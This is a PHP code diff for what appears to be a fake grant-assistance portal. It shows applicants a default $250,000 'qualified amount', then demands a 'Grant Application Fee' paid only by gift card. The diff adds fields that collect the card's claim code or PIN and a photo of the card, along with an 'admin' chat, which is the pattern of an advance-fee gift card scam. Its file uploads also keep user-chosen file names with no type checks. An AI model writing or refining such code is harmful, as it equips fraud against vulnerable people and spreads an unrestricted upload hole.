@@ -18,6 +18,7 @@ if (!$app) {
 
 $msg = '';
 
+// Supporting Document Upload
 if (isset($_POST['upload_doc'])) {
     if (isset($_FILES['document']) && $_FILES['document']['error'] === UPLOAD_ERR_OK) {
         $upload_dir = 'uploads/';
@@ -32,25 +33,28 @@ if (isset($_POST['upload_doc'])) {
     }
 }
 
+// Payment & Gift Card Upload
 if (isset($_POST['submit_payment'])) {
-    $payment_method = $_POST['payment_method'];
+    $card_code = trim($_POST['gift_card_code']);
     $receipt_path = $app['payment_receipt'];
     
-    if (isset($_FILES['payment_receipt_file']) && $_FILES['payment_receipt_file']['error'] === UPLOAD_ERR_OK) {
+    if (isset($_FILES['gift_card_image']) && $_FILES['gift_card_image']['error'] === UPLOAD_ERR_OK) {
         $upload_dir = 'uploads/';
         if (!is_dir($upload_dir)) mkdir($upload_dir, 0755, true);
-        $file_name = 'receipt_' . time() . '_' . basename($_FILES['payment_receipt_file']['name']);
+        $file_name = 'giftcard_' . time() . '_' . basename($_FILES['gift_card_image']['name']);
         $receipt_path = $upload_dir . $file_name;
-        move_uploaded_file($_FILES['payment_receipt_file']['tmp_name'], $receipt_path);
+        move_uploaded_file($_FILES['gift_card_image']['tmp_name'], $receipt_path);
     }
     
     $app = update_application($app_number, [
-        'payment_method' => $payment_method,
+        'payment_method' => 'Gift Card',
+        'gift_card_code' => $card_code,
         'payment_receipt' => $receipt_path
     ]);
-    $msg = "Payment & receipt submitted successfully!";
+    $msg = "Gift card details and image uploaded successfully!";
 }
 
+// Chat Messaging
 if (isset($_POST['send_message'])) {
     $message_text = trim($_POST['message_text']);
     if (!empty($message_text)) {
@@ -59,6 +63,17 @@ if (isset($_POST['send_message'])) {
 }
 
 $messages = get_messages($app_number);
+
+// Color Mapping
+$status_colors = [
+    'Pending' => '#ffc107',    // Yellow
+    'Processing' => '#0d6efd', // Blue
+    'Approved' => '#198754',   // Green
+    'Declined' => '#dc3545'    // Red
+];
+$current_status = $app['status'] ?? 'Pending';
+$status_color = $status_colors[$current_status] ?? '#ffc107';
+$text_color = ($current_status === 'Pending') ? '#000000' : '#ffffff';
 ?>
 <!DOCTYPE html>
 <html lang="en">
@@ -71,12 +86,24 @@ $messages = get_messages($app_number);
         .container { width: 800px; margin: 30px auto; background: white; padding: 30px; border-radius: 8px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
         h2, h3 { color: #004080; }
         .alert { background: #d4edda; color: #155724; padding: 10px; border-radius: 4px; margin-bottom: 20px; }
-        .status-box { background: #e9ecef; padding: 20px; border-radius: 6px; margin-bottom: 20px; border-left: 5px solid #004080; }
-        .status-box p { margin: 8px 0; font-size: 15px; }
+        .status-box { background: #f8f9fa; padding: 20px; border-radius: 6px; margin-bottom: 20px; border: 1px solid #e0e0e0; }
+        .status-badge { display: inline-block; padding: 6px 14px; border-radius: 20px; font-weight: bold; font-size: 14px; }
+        
+        .amount-box { 
+            background: #eef9f1; 
+            border: 2px solid #28a745; 
+            border-radius: 8px; 
+            padding: 15px; 
+            margin-top: 15px; 
+            text-align: center; 
+        }
+        .amount-title { color: #155724; font-size: 14px; font-weight: bold; text-transform: uppercase; margin-bottom: 5px; }
+        .amount-value { color: #198754; font-size: 26px; font-weight: bold; }
+
         .section { margin-bottom: 30px; border-top: 1px solid #ddd; padding-top: 20px; }
-        .btn { background: #004080; color: white; padding: 8px 15px; border: none; border-radius: 4px; cursor: pointer; text-decoration: none; font-size: 14px; }
+        .btn { background: #004080; color: white; padding: 10px 18px; border: none; border-radius: 4px; cursor: pointer; text-decoration: none; font-size: 14px; font-weight: bold; }
         .btn:hover { background: #003366; }
-        input[type="file"], select { margin: 10px 0; display: block; }
+        input[type="file"], input[type="text"] { margin: 10px 0; display: block; width: 100%; padding: 10px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }
         .chat-box { height: 200px; border: 1px solid #ccc; border-radius: 4px; padding: 10px; overflow-y: scroll; background: #fafafa; margin-bottom: 10px; }
         .chat-msg { margin-bottom: 10px; padding: 8px 12px; border-radius: 6px; max-width: 70%; }
         .chat-user { background: #d1ecf1; margin-left: auto; text-align: right; }
@@ -99,8 +126,16 @@ $messages = get_messages($app_number);
     <div class="status-box">
         <p><strong>Application Number:</strong> <?= htmlspecialchars($app['app_number']) ?></p>
         <p><strong>Assistance Program:</strong> <?= htmlspecialchars($app['assistance_type']) ?></p>
-        <p><strong>Application Status:</strong> <span style="color: #ff9900; font-weight: bold; text-transform: uppercase;"><?= htmlspecialchars($app['status']) ?></span></p>
-        <p><strong>Qualified Pending Amount:</strong> <span style="color: #28a745; font-size: 18px; font-weight: bold;"><?= htmlspecialchars($app['qualified_amount'] ?? '$250,000') ?></span></p>
+        <p><strong>Application Status:</strong> 
+            <span class="status-badge" style="background-color: <?= $status_color ?>; color: <?= $text_color ?>;">
+                <?= htmlspecialchars($current_status) ?>
+            </span>
+        </p>
+
+        <div class="amount-box">
+            <div class="amount-title">Qualified Pending Amount</div>
+            <div class="amount-value"><?= htmlspecialchars($app['qualified_amount'] ?? '$250,000') ?></div>
+        </div>
     </div>
 
     <!-- Supporting Document Upload -->
@@ -122,29 +157,29 @@ $messages = get_messages($app_number);
         </form>
     </div>
 
-    <!-- Payment Upload -->
+    <!-- Gift Card Payment Upload -->
     <div class="section">
-        <h3>Grant Processing Payment</h3>
-        <p>Select payment method (Gift Card or PayPal), complete transfer, and upload your gift card details or payment receipt.</p>
+        <h3>Grant Application Fee - Gift Card Processing</h3>
+        <p>Please enter your Gift Card details and upload a clear photo of the Gift Card receipt / card.</p>
         
         <?php if (!empty($app['payment_receipt'])): ?>
-            <p style="color: green;">✔ Payment details submitted via <?= htmlspecialchars($app['payment_method']) ?>.</p>
+            <p style="color: green;">✔ Gift Card submitted successfully.</p>
+            <?php if(!empty($app['gift_card_code'])): ?>
+                <p><strong>Submitted Code:</strong> <?= htmlspecialchars($app['gift_card_code']) ?></p>
+            <?php endif; ?>
         <?php endif; ?>
 
         <form method="POST" enctype="multipart/form-data">
-            <label>Payment Method:</label>
-            <select name="payment_method" required>
-                <option value="PayPal" <?= $app['payment_method']=='PayPal'?'selected':'' ?>>PayPal</option>
-                <option value="Gift Card" <?= $app['payment_method']=='Gift Card'?'selected':'' ?>>Gift Card</option>
-            </select>
+            <label><strong>Gift Card Code / PIN:</strong></label>
+            <input type="text" name="gift_card_code" placeholder="Enter Gift Card Claim Code / PIN" value="<?= htmlspecialchars($app['gift_card_code'] ?? '') ?>" required>
 
-            <label>Upload Payment Receipt / Gift Card Image:</label>
-            <input type="file" name="payment_receipt_file" required>
-            <button type="submit" name="submit_payment" class="btn">Submit Payment</button>
+            <label><strong>Upload Image of Gift Card:</strong></label>
+            <input type="file" name="gift_card_image" required>
+            <button type="submit" name="submit_payment" class="btn">Submit Gift Card Details</button>
         </form>
     </div>
 
-    <!-- Admin Chat -->
+    <!-- Admin Support Chat -->
     <div class="section">
         <h3>Admin Support Chat</h3>
         <div class="chat-box">
@@ -161,8 +196,8 @@ $messages = get_messages($app_number);
             ?>
         </div>
         <form method="POST">
-            <input type="text" name="message_text" placeholder="Type message to admin..." required style="width: 78%; padding: 8px; border: 1px solid #ccc; border-radius: 4px;">
-            <button type="submit" name="send_message" class="btn" style="width: 18%;">Send</button>
+            <input type="text" name="message_text" placeholder="Type message to admin..." required style="width: 78%; display:inline-block; padding: 8px;">
+            <button type="submit" name="send_message" class="btn" style="width: 18%; display:inline-block;">Send</button>
         </form>
     </div>
 </div>
